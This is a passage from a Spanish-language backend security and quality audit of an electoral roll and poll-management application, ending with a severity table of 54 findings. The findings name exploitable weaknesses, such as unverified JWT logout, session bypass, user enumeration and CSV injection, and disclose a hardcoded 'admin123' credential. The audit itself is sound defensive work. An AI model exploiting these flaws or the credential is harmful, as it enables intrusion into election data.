- **Sugerencia de solución:** Límite de body más chico específico para rutas de auth, dejando 10MB sólo donde se justifique (ej. importación).

---

### BE-037 — Sin `server.requestTimeout` explícito

- **Categoría:** Performance / Seguridad
- **Severidad:** Baja
- **Ubicación:** `src/server.js:71-79` (configura `keepAliveTimeout`/`headersTimeout` pero no `requestTimeout`, default de Node 20: 5 min)
- **Descripción:** Una conexión que envía el body muy lentamente puede mantener un socket ocupado hasta 5 minutos.
- **Impacto:** Superficie moderada para un ataque tipo slowloris a baja escala, proporcionalmente mayor en un proceso único.
- **Sugerencia de solución:** Fijar `servidor.requestTimeout` a 30-60s, igual que los otros dos timeouts.

---

### BE-038 — `GET /api/padron/auditoria/estadisticas` sin límite en `porUsuario`/`porTipo`

- **Categoría:** Performance
- **Severidad:** Baja
- **Ubicación:** `src/modules/auditoria/repository.js:97-119` — `porDia` tiene `LIMIT 30`, `porUsuario`/`porTipo` no
- **Descripción:** Acotado hoy por la cardinalidad de usuarios/operaciones, pero es la única consulta de auditoría sin techo explícito.
- **Sugerencia de solución:** Agregar `LIMIT` también a esas dos consultas.

---

### BE-039 — Inconsistencia de forma de respuesta en el listado de auditoría

- **Categoría:** Inconsistencia
- **Severidad:** Baja
- **Ubicación:** `src/modules/auditoria/routes.js:40-49` (`GET /`, responde sin `message`) vs. el resto de endpoints del módulo (siempre incluyen `message`)
- **Sugerencia de solución:** Agregar `message` también en el listado, por uniformidad de contrato.

---

### BE-040 — Sin normalización de `username` (case, espacios)

- **Categoría:** Mantenibilidad / Seguridad menor
- **Severidad:** Baja (incertidumbre: no se verificó si el frontend ya normaliza antes de enviar)
- **Ubicación:** `src/modules/auth/users.service.js:48` (`existeUsername`), `src/modules/auth/repository.js:146-148` — comparación case-sensitive, sin `trim()`
- **Descripción:** Se podrían crear `admin` y `Admin` (o `"admin "` con espacio final) como usuarios distintos.
- **Sugerencia de solución:** Normalizar (`toLowerCase().trim()`) antes de comparar/insertar, si el negocio no requiere distinguir mayúsculas.

---

### BE-041 — Código muerto y columnas de export duplicadas entre `repository.js` y `exporter.js`

- **Categoría:** Mantenibilidad
- **Severidad:** Baja
- **Ubicación:** `src/modules/padron/repository.js` — `COLUMNAS_EXPORT` (:19-26) y `streamExportacion` (:484-494), sin ningún llamador; `exporter.js:76-81` repite a mano casi la misma lista de columnas
- **Sugerencia de solución:** Eliminar el código muerto, o hacer que `exporter.js` reutilice esas constantes.

---

### BE-042 — `guardarDetalle` del padrón hace 5 round-trips a la base para una sola escritura

- **Categoría:** Performance
- **Severidad:** Baja
- **Ubicación:** `src/modules/padron/service.js:277-302`
- **Descripción:** No es N+1, pero es más chateo del necesario (`existeVotante`, `detallePorDni`, `votantePorDni` "anterior", el propio guardado, `votantePorDni` "después").
- **Sugerencia de solución:** Combinar consultas donde sea posible; baja prioridad dado el volumen actual (~5500 votantes).

---

### BE-043 — Duplicación de la lista de opciones políticas entre JS y el `CHECK` de SQL

- **Categoría:** Mantenibilidad
- **Severidad:** Baja
- **Ubicación:** `src/modules/padron/service.js:11` (`OPCIONES_POLITICAS`) vs. `migrations/001_esquema_padron.sql:27` (`CHECK (opcion_politica IN (...))`)
- **Descripción:** Agregar una opción política nueva exige tocar dos archivos en dos capas distintas; si se desincroniza, el error de Postgres llegaría sin traducir.

---

### BE-044 — Rango "inicio/fin" sin sentido cuando el resultado filtrado da cero filas

- **Categoría:** Inconsistencia
- **Severidad:** Baja
- **Ubicación:** `src/modules/padron/routes.js:109-110`
- **Descripción:** Con `total: 0`, la respuesta calcula "registros 1 a 0" — cosmético pero confuso si el frontend lo muestra tal cual.

---

### BE-045 — `fileFilter` de multer confía en mimetype/extensión que controla el cliente

- **Categoría:** Seguridad
- **Severidad:** Baja
- **Ubicación:** `src/modules/padron/routes.js:32-39`
- **Descripción:** La validación de "es CSV" se basa en `file.mimetype` o en que el nombre termine en `.csv`, ambos controlados por quien sube. No explotable directamente porque el contenido pasa luego por `csv-parser` y validación fila por fila, pero es un perímetro débil.

---

### BE-046 — Sin validación de rango para `anioNac` en alta manual de votante

- **Categoría:** Bug
- **Severidad:** Baja
- **Ubicación:** `src/modules/padron/service.js:106,117`
- **Descripción:** `crearVotante` acepta cualquier año parseable, incluyendo años futuros o absurdos, pudiendo dar edades negativas o de cientos de años. El impacto en estadísticas es bajo porque `estadisticasPorRangoEtario` agrupa lo demás en "Sin definir".
- **Sugerencia de solución:** Validar `anio > 1900 && anio <= añoActual`.

---

### BE-047 — Documentación desactualizada: "`fiscales.html` y `comicio.html` sin backend completo"

- **Categoría:** Mantenibilidad
- **Severidad:** Baja
- **Ubicación:** `CLAUDE.md` (sección "Deuda conocida"); contrastado contra `src/modules/comicio/module.js:5-7` y `src/modules/fiscales/module.js:1-12`
- **Descripción:** El backend de ambos módulos está completo (CRUD, fuerzas, mesas, votos, métricas, agenda, asignaciones con validación de doble solapamiento). La entrada de deuda conocida sigue listando ambas páginas como pendientes de backend.
- **Sugerencia de solución:** Actualizar la deuda conocida para aclarar que, si falta algo, es del lado frontend, no backend.

---

### BE-048 — Coerción silenciosa de `color` de fuerza inválido a `1`

- **Categoría:** Bug
- **Severidad:** Baja
- **Ubicación:** `src/modules/comicio/routes.js:18` (`extraerDatosFuerza`: `color: Number.isInteger(body.color) ? body.color : Number(body.color) || 1`)
- **Descripción:** Si `body.color` es `0`, `null`, `""` o no numérico, cae en `1` en vez de dejar pasar el valor para que la validación de rango (1-8) lo rechace explícitamente.
- **Sugerencia de solución:** Pasar el valor crudo (o `NaN`) y dejar que la validación del service sea la única que decide.

---

### BE-049 — Paginación de fiscales sin desempate estable

- **Categoría:** Bug / Performance
- **Severidad:** Baja
- **Ubicación:** `src/modules/fiscales/repository.js:33` (`ORDER BY nombre` sin segunda clave); comparar con `comicio/repository.js:123` (`ORDER BY c.created_at DESC, c.id DESC`)
- **Descripción:** Con nombres duplicados y paginación por `OFFSET`, filas pueden repetirse o saltarse entre páginas.
- **Sugerencia de solución:** `ORDER BY nombre, id`.

---

### BE-050 — `votos_blancos`/`votos_nulos` sin `CHECK >= 0` a nivel de base, a diferencia de `votos_fuerza.cantidad`

- **Categoría:** Inconsistencia / Mantenibilidad
- **Severidad:** Baja
- **Ubicación:** `comicio/migrations/001_esquema_comicio.sql:29-30` (sin CHECK) vs. `002_fuerzas_y_mesa_opcional.sql:30` (`CHECK (cantidad >= 0)`)
- **Descripción:** La validación de cantidad negativa hoy sólo vive en el service; un script o migración futura que escriba directo a `elecciones.mesas` no tiene ninguna barrera de base.
- **Sugerencia de solución:** Agregar los `CHECK` correspondientes en una migración nueva.

---

### BE-051 — `notas` vacía (`""`) se persiste como `NULL` en candidatos de listas

- **Categoría:** Bug
- **Severidad:** Baja
- **Ubicación:** `src/modules/listas/repository.js:103` (`candidato.notas || null`)
- **Descripción:** El operador `||` trata `''` como falsy: si se limpian las notas mandando `""`, se guarda `NULL` en vez de cadena vacía, perdiendo la distinción entre "no mandó notas" y "las vació".
- **Sugerencia de solución:** Usar `candidato.notas ?? null`.

---

### BE-052 — Sin validación de relación entre `cantidadLugares` y cantidad de candidatos en listas

- **Categoría:** Inconsistencia
- **Severidad:** Baja (incertidumbre: puede ser diseño intencional — el spec no lo exige)
- **Ubicación:** `src/modules/listas/service.js` (`validarDatosLista:14-26`, `validarCandidatos:68-101`)
- **Descripción:** `cantidadLugares` se valida como entero positivo pero nunca se contrasta contra `candidatos.length`. Se puede crear una lista con `cantidadLugares: 20` y sólo 2 candidatos.
- **Sugerencia de solución:** Confirmar con el dueño de producto si es un gap real antes del release; el spec permite borradores incompletos.

---

### BE-053 — Sin ownership/scoping de borradores de listas — cualquier `listas.view` ve todas las listas

- **Categoría:** Inconsistencia
- **Severidad:** Baja (incertidumbre: probablemente diseño intencional, el spec no define autor ni scoping)
- **Ubicación:** `listas/migrations/001_esquema_listas.sql:9-15` (sin columna de autor/propietario); `routes.js:31,44` (permiso único `listas.view` para todo)
- **Descripción:** No hay forma de exponer un borrador sólo a quien lo está armando; `listas.view` es todo-o-nada. El spec dice explícitamente que cualquier estado más allá de borrador está fuera de alcance, así que probablemente es aceptable, pero se deja documentado como decisión consciente, no omisión.

---

### BE-054 — `docker-compose.yml` versiona credenciales por defecto para el Postgres local

- **Categoría:** Seguridad
- **Severidad:** Baja
- **Ubicación:** `docker-compose.yml:26-27, 55-56` (`DB_USER`/`DB_PASSWORD` con defaults hardcodeados), puerto `5432` publicado al host (`:57-58`)
- **Descripción:** Son credenciales reales versionadas en texto plano, aunque sólo aplican al perfil opcional `local` (nunca a producción, que usa Supabase vía `DATABASE_URL`).
- **Impacto:** Bajo, acotado al entorno de desarrollo.
- **Sugerencia de solución:** Mover los defaults a `.env.example` en vez de hardcodearlos en el yaml versionado, si se quiere ser estricto.

---

## Resumen ordenado por severidad

| ID | Título | Categoría | Severidad |
|---|---|---|---|
| BE-001 | Logout no verifica firma JWT — cierre de sesión forzado de cualquier usuario | Seguridad | **Crítica** |
| BE-002 | Nuevo login no invalida refresh tokens anteriores — elude "sesión única" | Seguridad | **Crítica** |
| BE-003 | `TRUST_PROXY` como string sin convertir a número | Bug/Seguridad | Alta |
| BE-004 | Rate limit global insuficiente contra fuerza bruta | Seguridad | Alta |
| BE-005 | `POST /votantes` sobrescribe en silencio a un votante existente | Bug | Alta |
| BE-006 | Sin rate limiting específico ni lockout en `/login` | Seguridad | Alta |
| BE-007 | Enumeración de usuarios por canal de tiempo | Seguridad | Alta |
| BE-008 | Exportador de padrón sin manejo de errores de conexión a mitad de stream | Bug | Alta |
| BE-009 | TOCTOU en validación de doble solapamiento de fiscales | Bug/Seguridad | Alta |
| BE-010 | Cascada de borrado de comicio/mesa sin rastro completo en auditoría | Bug/Mantenibilidad | Alta |
| BE-011 | `PUT /listas/:id` no atómico entre metadata y candidatos | Bug | Alta |
| BE-012 | `jwt.verify` sin restringir `algorithms` | Seguridad | Media |
| BE-013 | Stack traces descartados en logs internos de producción | Mantenibilidad | Media |
| BE-014 | Sin advisory lock en el runner de migraciones | Bug/Mantenibilidad | Media |
| BE-015 | Permisos `admin.users`/`admin.roles` nunca verificados | Inconsistencia/Seguridad | Media |
| BE-016 | Refresh de sesión no se audita | Mantenibilidad/Auditoría | Media |
| BE-017 | `PUT /users/:id` no valida tipo de `activo` | Bug/Inconsistencia | Media |
| BE-018 | Política de contraseñas débil (mínimo 6 caracteres) | Seguridad | Media |
| BE-019 | Sin longitud máxima de password antes de hashear | Seguridad/Performance | Media |
| BE-020 | CSV Injection / Formula Injection en exportación | Seguridad | Media |
| BE-021 | Teléfono relevado visible con sólo `padron.view` | Seguridad | Media |
| BE-022 | Sin validación de formato/longitud de DNI | Inconsistencia | Media |
| BE-023 | Campo demasiado largo aborta importación de padrón completa | Bug | Media |
| BE-024 | Permisos `padron.export`/`resultados.export` no aplicados | Mantenibilidad | Media |
| BE-025 | Sin manejo de encoding en importación de CSV | Bug | Media |
| BE-026 | TOCTOU en solapamiento de rango de mesas | Bug | Media |
| BE-027 | Eliminar fiscal con asignaciones activas borra calendario sin aviso | Bug | Media |
| BE-028 | Falta validar `fuerzaId` duplicado al cargar votos | Bug | Media |
| BE-029 | Posible falta de índice compuesto sobre `padron.votantes` | Performance | Media |
| BE-030 | Falta cobertura de test para `TOPE_NOTAS` (Listas) | Mantenibilidad | Media |
| BE-031 | Sin tests de ruta para PUT/DELETE de listas | Mantenibilidad | Media |
| BE-032 | Credencial `admin123` hardcodeada en `api-snapshot.js` | Seguridad | Media |
| BE-033 | Orden de migraciones depende de disciplina de nombres | Mantenibilidad | Baja |
| BE-034 | Orígenes CORS de localhost hardcodeados en producción | Mantenibilidad | Baja |
| BE-035 | `crossOriginEmbedderPolicy: false` sin justificación | Mantenibilidad | Baja |
| BE-036 | Límite de body 10MB antes de auth/rate limit específico | Performance/Seguridad | Baja |
| BE-037 | Sin `server.requestTimeout` explícito | Performance/Seguridad | Baja |
| BE-038 | `auditoria/estadisticas` sin límite en `porUsuario`/`porTipo` | Performance | Baja |
| BE-039 | Inconsistencia de forma de respuesta en listado de auditoría | Inconsistencia | Baja |
| BE-040 | Sin normalización de `username` | Mantenibilidad | Baja |
| BE-041 | Código muerto y columnas de export duplicadas | Mantenibilidad | Baja |
| BE-042 | `guardarDetalle` hace 5 round-trips por escritura | Performance | Baja |
| BE-043 | Opciones políticas duplicadas entre JS y `CHECK` SQL | Mantenibilidad | Baja |
| BE-044 | Rango inicio/fin sin sentido con 0 filas | Inconsistencia | Baja |
| BE-045 | `fileFilter` de multer confía en mimetype/extensión del cliente | Seguridad | Baja |
| BE-046 | Sin validación de rango para `anioNac` | Bug | Baja |
| BE-047 | Documentación desactualizada sobre backend de comicio/fiscales | Mantenibilidad | Baja |
| BE-048 | Coerción silenciosa de `color` de fuerza inválido a 1 | Bug | Baja |
| BE-049 | Paginación de fiscales sin desempate estable | Bug/Performance | Baja |
| BE-050 | `votos_blancos`/`votos_nulos` sin `CHECK >= 0` | Inconsistencia | Baja |
| BE-051 | Notas vacías se persisten como `NULL` en candidatos | Bug | Baja |
| BE-052 | Sin validar relación `cantidadLugares` vs. candidatos | Inconsistencia | Baja |
| BE-053 | Sin ownership/scoping de borradores de listas | Inconsistencia | Baja |
| BE-054 | Credenciales por defecto versionadas en `docker-compose.yml` | Seguridad | Baja |

**Totales:** 2 Crítica · 9 Alta · 21 Media · 22 Baja = **54 hallazgos**
